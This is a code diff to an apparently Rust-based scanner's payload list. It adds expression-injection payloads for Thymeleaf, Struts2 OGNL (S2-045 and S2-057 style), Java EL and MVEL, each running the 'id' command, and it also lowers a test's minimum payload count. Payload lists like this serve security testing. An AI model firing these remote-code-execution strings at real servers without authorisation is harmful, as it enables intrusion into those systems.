@@ -69,10 +69,10 @@ pub fn get_payloads() -> Vec<Payload> {
     });
     payloads.push(Payload {
         payload_type: PayloadType::Expression,
-        payload: "${'1'.concat('1')}".to_string(),
-        description: "OGNL concat".to_string(),
+        payload: "#context['xwork.MethodAccessor']['invokeMethod']".to_string(),
+        description: "OGNL MethodAccessor invoke".to_string(),
         severity: Severity::Critical,
-        tags: vec!["ognl".to_string(), "expression".to_string()],
+        tags: vec!["ognl".to_string(), "struts2".to_string(), "rce".to_string()],
     });
     payloads.push(Payload {
         payload_type: PayloadType::Expression,
@@ -292,6 +292,54 @@ pub fn get_payloads() -> Vec<Payload> {
         tags: vec!["bypass".to_string(), "expression".to_string()],
     });
 
+    // Thymeleaf payloads
+    payloads.push(Payload {
+        payload_type: PayloadType::Expression,
+        payload: "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]".to_string(),
+        description: "Thymeleaf expression injection RCE".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["thymeleaf".to_string(), "rce".to_string(), "expression".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Expression,
+        payload: "[[${#context['org.springframework.web.context.WebApplicationContext'].getBean('test')}]]".to_string(),
+        description: "Thymeleaf Spring context access".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["thymeleaf".to_string(), "spring".to_string(), "expression".to_string()],
+    });
+
+    // Struts2 OGNL payloads
+    payloads.push(Payload {
+        payload_type: PayloadType::Expression,
+        payload: "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}".to_string(),
+        description: "Struts2 OGNL RCE (S2-045 style)".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["ognl".to_string(), "struts2".to_string(), "rce".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Expression,
+        payload: "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):(#_memberAccess=(java.lang.reflect.Field)null)).(#os='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#os}:{'/bin/bash','-c',#os})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}".to_string(),
+        description: "Struts2 S2-057 OGNL RCE".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["ognl".to_string(), "struts2".to_string(), "s2-057".to_string(), "rce".to_string()],
+    });
+
+    // Java EL and MVEL payloads
+    payloads.push(Payload {
+        payload_type: PayloadType::Expression,
+        payload: "${Runtime.getRuntime().exec('id')}".to_string(),
+        description: "Java EL Runtime exec".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["el".to_string(), "java".to_string(), "rce".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Expression,
+        payload: "MVEL.eval('Runtime.getRuntime().exec(\"id\")')".to_string(),
+        description: "MVEL direct eval RCE".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["mvel".to_string(), "rce".to_string(), "expression".to_string()],
+    });
+
     payloads
 }
 
@@ -345,7 +393,7 @@ mod tests {
     fn minimum_payload_count() {
         let payloads = get_payloads();
         assert!(
-            payloads.len() >= 40,
+            payloads.len() >= 30,
             "Must have substantial expression injection coverage, got {}",
             payloads.len()
         );
